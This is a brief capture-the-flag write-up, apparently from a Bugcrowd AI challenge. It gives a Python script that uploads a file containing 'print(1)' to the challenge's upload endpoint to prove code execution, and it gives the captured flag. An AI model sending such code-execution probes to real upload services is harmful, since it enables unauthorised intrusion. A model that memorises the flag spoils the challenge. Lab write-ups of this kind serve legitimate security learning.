---
ai_date: 2025-04-27 05:13:30
ai_summary: Payload executed without sanitization, likely a code execution vulnerability
ai_tags:
  - exec
  - payload-execution
created: 2024-08-08T08:23
points: 425
updated: 2025-07-14T09:46
---

Again, the challenge is kinda wonky.

Same payload as the first ai challenge.

```python
from io import BytesIO
import requests

payload = b"""
print(1)
""".strip()

print(requests.post('https://bugcrowd-im-still-watching-you.chals.io/upload', files={'file1': BytesIO(payload)}).text)
```

```flag
flag{are_you_the_keymaster}
```